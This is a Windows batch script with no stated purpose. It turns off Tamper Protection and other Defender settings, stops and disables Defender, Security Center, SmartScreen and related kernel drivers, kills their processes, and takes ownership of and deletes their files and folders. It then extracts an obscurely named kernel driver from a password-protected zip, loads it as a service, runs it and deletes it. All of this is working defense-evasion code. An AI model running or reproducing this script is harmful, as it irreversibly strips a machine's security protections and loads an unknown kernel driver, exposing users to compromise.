@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 4 /f >nul 2>&1
Set-MpPreference -DisableCoreServiceTelemetry $true
Set-MpPreference -PUAProtection 0
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -CloudBlockLevel 0
Set-MpPreference -DisableNetworkProtection $true
Set-MpPreference -EnableControlledFolderAccess 0
Set-MpPreference -EnableEnhancedPhishingProtection 0
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -ScanScheduleDay 8
sc config SecurityHealthService start= disabled >nul 2>&1
sc stop SecurityHealthService >nul 2>&1
sc config wscsvc start= disabled >nul 2>&1
sc stop wscsvc >nul 2>&1
sc config Sense start= disabled >nul 2>&1
sc stop Sense >nul 2>&1
sc config SgrmBroker start= disabled >nul 2>&1
sc stop SgrmBroker >nul 2>&1
sc config SgrmAgent start= disabled >nul 2>&1
sc stop SgrmAgent >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config webthreatdefsvc start= disabled >nul 2>&1
sc stop webthreatdefsvc >nul 2>&1
sc config webthreatdefusersvc start= disabled >nul 2>&1
sc stop webthreatdefusersvc >nul 2>&1
sc config MDDlpSvc start= disabled >nul 2>&1
sc stop MDDlpSvc >nul 2>&1
sc config MDCoreSvc start= disabled >nul 2>&1
sc stop MDCoreSvc >nul 2>&1
sc config whesvc start= disabled >nul 2>&1
sc stop whesvc >nul 2>&1
sc config WdFilter start= disabled >nul 2>&1
sc stop WdFilter >nul 2>&1
sc config WdNisDrv start= disabled >nul 2>&1
sc stop WdNisDrv >nul 2>&1
sc config MsSecFlt start= disabled >nul 2>&1
sc stop MsSecFlt >nul 2>&1
sc config MsSecCore start= disabled >nul 2>&1
sc stop MsSecCore >nul 2>&1
sc config MsSecWfp start= disabled >nul 2>&1
sc stop MsSecWfp >nul 2>&1
sc config PlutonHeci start= disabled >nul 2>&1
sc stop PlutonHeci >nul 2>&1
sc config PlutonHsp2 start= disabled >nul 2>&1
sc stop PlutonHsp2 >nul 2>&1
sc config Hsp start= disabled >nul 2>&1
sc stop Hsp >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WdBoot start= disabled >nul 2>&1
sc stop WdBoot >nul 2>&1
taskkill /f /t /im MsMpEng.exe >nul 2>&1
taskkill /f /t /im NisSrv.exe >nul 2>&1
taskkill /f /t /im MpCmdRun.exe >nul 2>&1
taskkill /f /t /im MpDefenderCoreService.exe >nul 2>&1
taskkill /f /t /im smartscreen.exe >nul 2>&1
taskkill /f /t /im SecurityHealthService.exe >nul 2>&1
taskkill /f /t /im SecurityHealthHost.exe >nul 2>&1
taskkill /f /t /im SecurityHealthSystray.exe >nul 2>&1
taskkill /f /t /im uhssvc.exe >nul 2>&1
taskkill /f /t /im AggregatorHost.exe >nul 2>&1
( takeown /s %computername% /u %username% /f "C:\ProgramData\Microsoft\Windows Defender\Platform" & icacls "C:\ProgramData\Microsoft\Windows Defender\Platform" /grant:r %username%:F & taskkill /im MsMpEng.exe /f & taskkill /im NisSrv.exe /f & del "C:\ProgramData\Microsoft\Windows Defender\Platform" /s /f /q ) >nul 2>&1
for %%F in (C:\Windows\WinSxS\FileMaps\wow64_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\x86_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\amd64_windows-defender*.manifest C:\Windows\System32\SecurityAndMaintenance_Error.png C:\Windows\System32\SecurityAndMaintenance.png C:\Windows\System32\SecurityHealthSystray.exe C:\Windows\System32\SecurityHealthService.exe C:\Windows\System32\SecurityHealthHost.exe C:\Windows\System32\MpSigStub.exe C:\Windows\System32\drivers\SgrmAgent.sys C:\Windows\System32\drivers\WdDevFlt.sys C:\Windows\System32\drivers\WdBoot.sys C:\Windows\System32\webthreatdefsvc.dll C:\Windows\System32\webthreatdefusersvc.dll C:\Windows\System32\webthreatdefsvc.dll.mui C:\Windows\System32\webthreatdefusersvc.dll.mui C:\Windows\System32\drivers\WdFilter.sys C:\Windows\System32\wscsvc.dll C:\Windows\System32\drivers\WdNisDrv.sys C:\Windows\System32\wscproxystub.dll C:\Windows\System32\wscisvif.dll C:\Windows\System32\SecurityHealthProxyStub.dll C:\Windows\System32\smartscreen.dll C:\Windows\SysWOW64\smartscreen.dll C:\Windows\System32\smartscreen.exe C:\Windows\SysWOW64\smartscreen.exe C:\Windows\System32\SmartScreenSettings.exe C:\Windows\SysWOW64\SmartScreenSettings.exe C:\Windows\SysWOW64\smartscreenps.dll C:\Windows\System32\smartscreenps.dll C:\Windows\System32\SecurityHealthCore.dll C:\Windows\System32\SecurityHealthSsoUdk.dll C:\Windows\System32\SecurityHealthSSO.dll C:\Windows\System32\SecurityHealthUdk.dll C:\Windows\System32\SecurityHealthAgent.dll C:\Windows\System32\drivers\mssecwfp.sys C:\Windows\System32\winshfhc.dll C:\Windows\SysWOW64\winshfhc.dll C:\Windows\System32\mssecwfpu.dll C:\Windows\System32\wscapi.dll C:\Windows\System32\wscadminui.exe C:\Windows\System32\ieapfltr.dll C:\Windows\SysWOW64\ieapfltr.dll C:\Windows\System32\SgrmLpac.exe C:\Windows\System32\Sgrm\SgrmLpac.exe C:\Windows\System32\SgrmBroker.exe C:\Windows\System32\Sgrm\SgrmBroker.exe C:\Windows\System32\drivers\msseccore.sys C:\Windows\system32\drivers\MsSecFltWfp.sys C:\Windows\system32\drivers\MsSecFlt.sys C:\Windows\ELAMBKUP\WdBoot.sys C:\Windows\System32\mssecuser.dll C:\Windows\System32\windowsdefenderapplicationguardcsp.dll C:\Windows\SysWOW64\windowsdefenderapplicationguardcsp.dll) do if exist "%%~F" (takeown /f "%%~F" /a >nul 2>&1 & icacls "%%~F" /grant *S-1-5-32-544:F /c /l >nul 2>&1 & del /f /q "%%~F" >nul 2>&1)
for /d %%D in ("C:\ProgramData\Microsoft\Windows Defender" "C:\Program Files\Windows Defender" "C:\Program Files (x86)\Windows Defender" "C:\Program Files\Windows Defender Advanced Threat Protection" "C:\Program Files\Windows Defender Sleep" "C:\Program Files\Windows Security" "C:\Program Files\PCHealthCheck" "C:\Program Files\Microsoft Update Health Tools" "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" "C:\ProgramData\Microsoft\Windows Security Health" "C:\ProgramData\Microsoft\Storage Health" "C:\Windows\System32\drivers\wd" "C:\Windows\System32\SecurityHealth" "C:\Windows\System32\WebThreatDefSvc" "C:\Windows\System32\Sgrm" "C:\Windows\System32\HealthAttestationClient" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender" "C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\Windows Defender" "C:\Windows\security\database") do if exist "%%~D" (takeown /f "%%~D" /r /d y >nul 2>&1 & icacls "%%~D" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >nul 2>&1 & rd /s /q "%%~D" >nul 2>&1)
cd /d "%~dp0"
set "DKSys=%~dp0iamdrvd77hello.sys"
"C:\Program Files\7-Zip\7z.exe" x -aoa -bso0 -bsp1 "%~dp0DKTT.zip" -p"DDK" "iamdrvd77hello.sys" >nul
sc create dkkddkkk type= kernel binPath= "%DKSys%" >nul 2>&1
net start dkkddkkk
timeout /t 2 /nobreak >nul
sc stop dkkddkkk >nul 2>&1
net start dkkddkkk
sc stop dkkddkkk >nul 2>&1
sc delete dkkddkkk >nul 2>&1
del /q "%DKSys%" >nul 2>&1
exit